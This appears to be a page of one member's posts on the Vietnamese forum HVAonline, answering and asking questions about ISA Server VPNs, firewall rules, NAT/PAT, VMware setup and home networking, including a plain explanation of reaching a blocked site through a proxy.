			<span class="postbody">Mong các bạn giúp mình với. Mình có mô hình như sau:<br/><br/> Client SG--&gt;ISA SG (workgroup)--&gt; Modem--&gt; Internet &lt;--Modem&lt;-- ISA HN(DC)&lt;--Client HN<br/><br/> + Mình đã thử Client ở site này, connct vào VPN của site kia thì bình thường. (ví dụ như client SG connect VPN đến ISA HN thì bình thường).<br/><br/> +Khi mình cài đặt VPN site-to-site trên 2 con ISA ở 2 site, cấu hình ko sai gì cả. Nhưng bị tình trạng là khi vào RRAS kiểm tra thì chỉ 1 trong 2 Demand Dial in ở 2 site trong tình trạng Connect mà thôi.Ví dụ như vào site SG, vào RRAS, thấy Demand Dial đến ste HN là Connected thì bên site HN, Demand Dial đến site SG bị Unreachable.<br/><br/> Nếu em click chuột phải vào Demand Dial bị Unreachable, chọn Connect, thì nó báo "The Modem (or Connecting Device) has a problem" , đồng thời lúc đó Demand Dial đang Connected ở site còn lại sẽ tự động Disconnect.<br/><br/> Không bao giờ 2 site đều báo tình trạng "Connected" cả,chỉ 1 trong 2 là Connected thôi, cái còn lại sẽ là Unreachable. Mình đã xóa và làm lại rất nhiều lần, vẫn không được.<br/><br/> Mình cũng đã NAT port 1723 và 1701 trên modem ở 2 site hết rùi. Và nếu bỏ ISA ở 2 site ra, chỉ xài RRAS để VPN 2 site thông qua Demand Dial Interface thì hoạt động tốt. Chỉ khi xài ISA 2006, create 1 VPN site-to-site là bị.<br/><br/> Thanks nhiều</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.hva">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/24688.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/24688/149364.hva#149364,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Bạn hiểu vậy chi cho rắc rối. Mình xin giải thích cho bạn 1 cách đơn giản và dễ hiểu nè:<br/><br/> Khi 1 Packet được gửi đến FireWall (FW) thì FW sẽ xem các rule đã có từ trên xuống dưới. Có nghĩa là nếu rule 1 bạn ko cho phép đi qua port 80, thì dù cho rule thứ 2 bạn "allow all port" đi nữa thì các máy client cũng vẫn sẽ ko vào web đc..Và ngược lại nếu Rule 1 cho phép đi qua port 80 mà rule 2 deny all port thì client vẫn đi web đc..OK<br/><br/> Còn về phần nào trong Packet đc dùng để match với các rule thì đó là phần header của Packet.Nó sẽ xem xét Address/Port Source và Destination xem có phù hợp với các Rule ko..Rất ít trường hợp can thiệp vào sâu bên trong phần nội dung Data của Packet (nhưng mà vẫn có chứ không phải là không, như cấm trang web có chữ "XXX" hay ko cho phép gửi mail có dính chữ " lật đổ " chẳng hạn...)<br/><br/> Thân </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.hva">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/24493.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/24493/148082.hva#148082,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Bạn có thể làm như sau:<br/><br/> Ở card mạng Lan, bạn chọn<b> Allow other network computer use this computer...</b> để cho phép người khác trong La trỏ default gateway của họ về địa chỉ IP của card mạng này..<br/><br/> Còn về phần default gatway trên card Lan thì bạn nên trỏ về địa chỉ IP của card Wireless , để mọi packet đều sẽ được gửi thông qua card Wireless-Internet.<br/><br/> Thân<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.hva">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/22925.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/22925/147613.hva#147613,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">KenAX wrote:</cite><br>
<blockquote>Cám ơn anh kénhin đã giúp em. Qua bài viết của anh em giúp em hiểu thêm về cách thức hoạt động của ISA.<br/> Cho em hỏi anh thêm một vài câu nữa. <img src="/hvaonline/images/smilies/3019f422209a6593f02fad5560f36b79.gif" border="0" alt="smilie" align="absbottom"><br/> Máy tính em đang ở trong LAN, IP của con máy chứ ISA là 10.90.1.140, và địa chỉ defualt gateway 10.90.1.1.<br/> Giờ làm sao từ máy em móc đến card External của con ISA, ko biết viết vậy có đúng ko nhưng ý em là muốn nó chạy như con máy riêng biệt đó.&nbsp;
</blockquote><br/><br/> Làm sao được em ơi, vì muốn đến được card External của ISA thì em vẫn phải đến ISA trước. mà muốn đến ISA thì phải chỉ default gateway của máy em là IP của card Internal của ISA. Giống như em muốn đến cửa sau của 1 nhà nào đó thì phải vào = cửa trước chứ... <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"><br/><br/> Nếu em muốn lách ISA thì dùng cách anh nêu phía trên đó.<br/><br/> Thân</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.hva">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/24183.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/24183/145979.hva#145979,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Router ảo GNS3 thì mình ko bit, nhưng bạn có thể dung chức năng <b>router and remote access</b> của window sever 2003 đi. Khá dễ cho newbie...:d<br/><br/> Thân</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.hva">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/24118.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/24118/145526.hva#145526,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Chào các bạn, mình xin post lỗi này cho anh em cùng xem xét nha. Hầu như mọi giả thuyết của mình cho tới hiện giờ đều sai bét hết rùi.. <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"><br/><br/> (Hệ điều hành đang sử dụng là Windows XP sp2)<br/><br/> Sự việc là như thế này, mình hay đọc tài liệu trên web và cả trên HVA nhưng đôi khi có chuyện bận phải đi nhưng ko muốn Shutdown máy vì sợ sau này phải tim lại link hơi cực <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"> , với lại đang download nên cũng ko muốn stop, chỉ Pause thui. Sau đó mình <b>Hibernate</b> máy đi. lúc đầu vẫn bình thường nhưng có "chuyện xảy ra" khi mình cài Firefox 3.0 vào. Tình trạng như thế này:<br/> + Cách đây 2 tuần, khi vào lại máy tính sau khi đã <b>Hibernate</b> thì vào web = firefox ko được, vào bằng IE thì OK. Nhưng sau khi restarrt lại thì bình thường ==&gt;; mình đoán là lỗi Firefox ver 3.0 (lỗi 1).<br/> + Cách đây mấy ngày, vẫn bị tình trạng như vậy nhưng lúc này cả IE cũng ko vào được, restart lại Modem cũng vậy. Sau khi bật HideIP ver 3.42 thì OK==&gt; mình đoán là virus(lỗi 2), sau đó dùng antivirus client quét sạch .suy ra lỗi 1 sai <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"> .<br/> + Ngay mới lúc nãy, bị lỗi như lỗi 2, nhưng có bật HideIP hay tắt nó đi thì cũng tiêu. Cả Yahoomessenger cũng ko vào được lun. Sau khi restart máy lại thì bình thường==&gt;; mình đoán lỗi do chế độ<b> Hibernating</b> của window nhưng lúc đầu ko có bị như vậy. Suy ra,<b> Lỗi 1</b> và <b>Lỗi 2</b> có khả năng sai bét nhè...<br/><br/> Xin các anh em cho ý kiến xem sao.<br/><br/> Thân<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.hva">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/24114.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/24114/145497.hva#145497,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">mình đang xài O2 thì chỉ cần cài ActiveSyn trên cả máy bạn và trên Pocket PC .Sau đó dùng cable kết nối POcket PC của bạn vào máy tính = cổng USB, đợi sau khi nónha65n đựoc thiết bị là bạn có thể truy cập Internet trên PPC rùi.Ko cần phải configure gì thêm...Theo mình biết thì tất cả PPC xài OS Window Mobile đều có thể làm như trên, còn 1 số OS khác như Linux thì mình chưa thử nên ko biết..<br/><br/> Nhưng coi chừng về nguồn của PPC và PC nha..một số Main cấp nguồn mạnh quá dẫn đến hiện tượng điện giật khi chạm vào vỏ của PPC, có thể dẫn đến hư Pin or hư interface sạc pin..<br/><br/> Thân</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.hva">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/22925.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/22925/145491.hva#145491,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Máy Isa có 3 Card đều là card network thật đấy chứ, ko phải ảo đâu. Chẳng qua bạn phải vào ISA Server configure cho nó biết cái nào là Internal, External, và DMZ..Khi chọn mô hình Network + firewall thì phải chọn loại DMZ vì default đa số là kiểu "Edge" ( hay gì đó mà có được ISA minh họa bằng hình 1 vòng tròn bảo vệ Network..)<br/><br/> Khi bạn chọn kiểu DMZ xong thì bạn phải configure cho các máy Server trong vùng DMZ(thường là web,mai server )l trỏ default gateway về card mạng mà ISa quy định là sẽ kết nối với vùng DMZ..<br/><br/> Sau đó, các máy trong mạng Lan sẽ trỏ default gateway về card Internal của Isa..Còn card External của Isa thì trỏ default gateway về Modem kết nối Internet...<br/><br/> Sau đây xin trả lời bạn KenAX về việc lách ISA.<br/><br/> Theo mình thì bạn ko thể lách Isa, vì tất cả mọi traffic đều phải thông qua Isa server (ví dụ như mô hình trên) nên nó sẽ kiểm soát mọi Packet ra / vào Network. Nhưng bạn vẫn có thể đánh lừa ISA nếu người Admin ko cấu hình Isa filter các Packet 1 cách chặt chẽ.<br/><br/> Ví dụ như bạn muốn vào www.vnn.vn mà ISa thì cấm ko cho các request từ trong mạng ra ngoài đến trang web đó. Do đó bạn có thể lách bằng cách dùng cách thay đổi Proxy ( định nghĩa và phương thức hoạt động cơ bản về Proxy bạn có thể tìm thêm trong HVA ).Mình chỉ giải thích nguyên lý làm việc trong trường hợp này thui hen.<br/><br/> <font color='violet'>Bình thường nếu bạn gửi 1 request muốn đến website www.vnn.vn qua ISA thì ISA sẽ xem phần header của Packet và thấy địa chỉ bạn muốn đi đến là ko hợp lệ/bị cấm, khi đó nó sẽ discard request của bạn làm bạn ko thể tới được web server của vnn. Nhưng khi bạn đã chọn cho mình 1 proxy (mình sẽ hướng dẫn ở phía dưới) thì khi bạn gửi 1 request về ISA thì ISA sẽ hiểu lầm bạn chỉ muốn gửi Request đến Proxy đó mà thui, chứ ko phải đến trang web bị cấm là www.vnn.vn .Vì trong phần Header của request sẽ là địa chỉ của proxy server chứ ko phải là địa chỉ của ttrang web vnn.vn bị cấm. Khi đó nó sẽ cho phép request của bạn được đi qua và đến Proxy server mà bạn đã chọn..<br/> Khi đến được proxy server thì nó sẽ xem xét yêu vầu của bạn và thấy bạn muốn được đi đến web vnn.vn. Do đó, nó sẽ gửi 1 gói tin trong đó phần nội dung của gói tin là yêu cầu của bạn về website vnn.vn đến cho web server của vnn.vn với địa chỉ Source là chính Proxy server..<br/> Khi gói tin được vnn.vn trả lời thì Proxy sẽ lấy nội dung trong gói tin ấy mà trả lời cho bạn..Khi gói tin đi về với bạn gặp phải ISA thì ISA tiếp tục xem xét xem gói tin này có đến từ 1 địa chỉ bị cấm ko, nếu bị cấm thì nó sẽ lại discard packet reply này..Nhưng lúc này, packet được gửi tới cho bạn với địa chỉ từ Proxy server nên ISA sẽ cho qua, và thế là về đến máy bạn..<br/> </font><br/><br/> Trong IE, bạn muốn chỉnh Proxy thì có thể vào <b>Option</b> , chọn thẻ <b>Connection</b>, vào phần <b>LAN settings</b>. Khi đó sẽ hiện ra cửa sổ cho bạn điền Proxy và port của nó vào (default là nó bị disable, bạn phải check thì nó mới enable)..Còn trong Firefox và 1 số trình duyệt khác cũng tương tự.<br/><br/> Thông tin về địa chỉ và Port của các Proxy thì bạn có thể vào 1 số website cung cấp Proxy free như www.proxy4free.com . Nhưng có thể bạn sẽ gặp phải địa chỉ Proxy đã chết hoặc ko hoạt động khi đó bạn phải chọn lại. Nếu muốn tránh trường hợp proxy ko sử<b> dụng được và tốn thời gian chọn lựa thì bạn có thể xài Soft: [b]ProxySwitcherpro</b> hay <b> HideIP</b> để nó tự động lựa chọn Proxy còn sống dùm cho bạn...<br/><br/> Thân</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/27.hva">Thông tin về các địa chỉ và tài liệu hữu ích</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23416.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23416/143514.hva#143514,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Sao ko ai trả lời giúp mình hết vậy.....</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/27.hva">Thông tin về các địa chỉ và tài liệu hữu ích</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23416.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23416/142912.hva#142912,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Cho mình thắc mắc chút nha..<br/><br/> Mình cũng đã xài VM Ware rất nhiều năm rùi nhưng khi cài win Server thì vẫn cài theo phiên bản Máy ảo thường chứ ko sử dụng kiểu VM Ware Server. Vậy sẽ khác nhau ở điểm nào nếu cài đặt win Server trên VM Ware Server so với VM Ware thường..</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.hva">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23691.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23691/142909.hva#142909,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Sorry vì mình ko thể giúp vụ sản phẩm Foundry dc, vì mình chưa từng đụng vào nó..<br/> Nếu Cisco thì mình có thể giúp..<br/><br/> Còn về Nat pool thì có thể giải thích như sau:<br/> + Trước tiên, NAT có nghĩa là Network Address Translation . Nat Pool là 1 dãy ( range ) chứa các địa chỉ IP Public được thuê từ ISP. Nếu trong Nat pool có 3 địa chỉ Pubic IP thì khi các Client đi ra ngoài thông qua Router thì Router sẽ thực hiện NAT địa chỉ Private của Client đó ra 1 trong 3 địa chỉ Public đã thuê đó. Nếu cả 3 Public đã được sử dụng hết thì các yêu cầu từ các máy khác phải đứng chờ...<br/> + Thực tế thì người ta sử dụng bây giờ là biến thể của NAT , đó là PAT ( Port Address Translation ). Có nghĩa là khi có 1 Client muốn gửi 1 gói tin ( Packet ) ra Internet thì gói tin đó sẽ phải thuộc về 1 dịch vụ ( tương ứng với số Port cụ thể ) nào đó thì khi đó Router sẽ cung cấp 1 IP Public cho Client đó có dạng IP:<img src="/hvaonline/images/smilies/575eda61e93c7ad9d05928580213fd9b.gif" border="0" alt="smilie" align="absbottom">ort ( ví dụ như 203.162.4.190::80 , có nghĩa là gửi gói tin yêu cầu dịch vụ web đến Webserver từ 203.162.4.190 ). Khi đó Client thứ 2 muốn gửi gói tin về FTP (dịch vụ download files) thì Router sẽ ko dùng đến IP Public thứ 2 mà vẫn dùng IP thứ 1 và nó sẽ có dạng 203.162.4.190::21 (vì FTP có Port dịch vụ là 21 )..Và cứ thế cho đến khi nào hết số Port có thể cung cấp trên IP thứ 1 rồi Router mới chuyển qua dùng IP Pblic thứ 2<br/><br/> Như vậy thì sẽ tiết kiệm được địa chỉ IP rất nhiều. Điêu mà đã từng làm đau đầu rất nhiều nhà chiến lược về mạng, và nay đã dc giải quyết = IPv6<br/><br/> Theo như mình nhớ thì có đến hơn 65.000 port có thể dc cung cấp cho 1 Client khi đi ra Internet. Trong đó từ 1--&gt; 1024 là Port của các dịch vụ khá phổ biến như Web, FTP, Telnet...Phần cón lại dành cho một số dịch vụ đã được đăng ký sau này và 1 số khác để chúng ta có thể sử dụng free khi viết 1 chương trình nào đó hoạt động qua mạng như chat, đánh cờ qua mạng..v..v...<br/><br/> Thân<br/><br/><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.hva">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23666.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23666/142743.hva#142743,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">tieuvuong_net wrote:</cite><br>
<blockquote>Bồ thử miêu tả các bước cấu hình trong phần New Virtual Machine xem nào?&nbsp;
</blockquote><br/><br/> Hỏi mình hả???<br/><br/> Nếu ko phải thì cũng góp tí kinh nghiệm cho HVA hen :<br/><br/> Đầu tiên chọn new virtual machine--&gt;Next<br/><br/> chọn Typical hay Custom đều dc vì có thể vào chỉnh lại sau khi configure hoàn tất --&gt;Next<br/><br/> chọn OS muốn cài. Nếu cài MacOS thì chọn other--&gt;Next<br/><br/> chọn tên máy và nơi lưu trữ file máy ảo(dựa vào file này có thể tạo thêm nhiều máy ảo khác từ máy ảo đã cài đặt hoàn thành này)--&gt;Next<br/><br/> chọn <b>bride</b> để kết nối card mạng ảo đến card mạng thật của Desktop.<br/> chọn <b>NAT</b> để kết nối đến máy desktop = phương thức nat (như dial up chẳng hạn..v..v...)<br/> chọn <b>host only</b> để kết nối đến card mạng ảo mà VM Ware cung cấp cho Desktop<br/> --&gt;Next<br/><br/> hai thiết lập sau dùng cho khai báo dung lượng Harddisk ảo, mình thường chọn 6gb cho server và 4gb cho client. Còn 2 tùy chọn thì hình như giúp các bạn giới hạn dung lượng của file HardDisk ( giúp nó ko bị tăng lên tương ứng với các App mình cài vào máy ảo).Mình ít khi dùng tới vì sợ hư ỗ cứng khi nén dữ liệu kiểu đó..( các bạn chi giáo thêm phần này)<br/> --&gt;Next--&gt;Finish<br/><br/> Sau đo bạn sẽ có 1 PC ảo..Đến đây bạn phải vào chỉnh <b>settings</b> cho PC mới này. Chủ yếu là thêm Card mạng, thêm Ram, và chỉngh Boot từ CD( quan trọng nhất là phần này, vì có người ko cài dc chỉ vì quên thiết lập cái này):<br/> + Congiure Card mạng hay Ram thì khá đơn giản nên mình ko nói thêm..<br/> + Configure CDRom: đề phòng bạn có 2 CDROM hay có cài soft hỗ trợ CDRom ảo như virtual driver, Alcohol, Demon tool,..v.v...Configure khá đơn giản, chỉ việc chọn ổ CD nào bạn sẽ bỏ đĩa Cd ( file ISO) vào cài là dc..Sau đó OK<br/><br/> Đến đây bãn có thể Power máy lên rồi cài dc rùi..Quá trình cài y như PC thật.<br/><br/> Nếu cần hướng dẫn cụ thể về cấu hình mạng Domain tr6en VM Ware thi pm cho mình ha. Mình sẽ gửi bài có hình minh họa cụ thể cho. Hôm trước gửi 1 lần rùi.Hên mà còn giữ lại.. <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"><br/><br/> Thân</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.hva">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/1893.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/1893/142733.hva#142733,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><p></p>
<cite class="blockquote">microsoft_hn wrote:</cite><br>
<blockquote><br/> Nếu máy bên đó để tự nhận IP hoặc dùng Workgroup khác tên với MSHOME ---&gt;thì không vào internet (received=0).<br/> Một máy muốn vào internet phải điền đúng địa chỉ IP và thay đổi workgroup đúng MSHOME thì mới vào được<br/><br/> câu hỏi của em là họ làm thế nào được như thế em có áp dụng được không<br/> Em dùng modem Zyxel của FPT -IP connect modem:192.168.1.1-<br/> dùng 2 siwtch<br/> Nếu áp dụng được như họ thì em phải làm thế nào ??<br/><br/> &nbsp;
</blockquote><br/><br/> <b>Yêu cấu IP</b>---Nếu bạn xài DHCP thì giới hạn số IP sẽ cấp cho PC mà minh muốn xuống. Tự động khi hết IP ( ví dụ bạn cho 10 thằng mà thằng thứ 11 cắm vào) thì PC mới cắm vào buộc phải điền đúng địa chỉ dãy (range) IP đang xử dụng..Còn nếu muốn ko cho PC thứ 11 vào khi đã đủ 10 PC thì giới hạn luôn số IP được phép sử dụng trên Modem/Router xuống còn 10 thằng giống với DHCP là OK. Khi đó dù nó điền đúng dãy IP thì cũng ko được kết nối đến Modem/Router (kiểu này hơi ác).. <img src="/hvaonline/images/smilies/8f173d0eaffc4b90c0c0361b8f37cc17.gif" border="0" alt="smilie" align="absbottom"><br/><br/> <b>Yêu cầu WorkGroup</b>---Bạn chỉ có thể xài thêm phần mềm trợ giúp khác như <b>ISA Server </b>hay <b>Group Policy của Domain Server</b> chứ mấy Modem mình biết hiện nay ko có chức năng Filter (lọc) WorkGroup, và 1 vấn đề nữa là WorkGroup phải tự điền = tay chứ ko thể Auto như DHCP được..<br/><br/> Thân</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/31.hva">Thảo luận mạng và thiết bị mạng</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23678.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23678/142726.hva#142726,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Theo mình thì nó dùng Lease Line ( giống như bạn IQ nói ), chứ ko thể có chuyện xảy ra vấn đề Nat trong Router ở Hop 9. Vì nếu Router mà "có vấn đề" về Nat thì Hop9 đó đâu thể forward packet đến Hop10 ..(ko biết có đúng ko, xin các bạn chỉ giáo thêm..)</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
				
        <!-- END OF POST LISTING -->
			
				

			
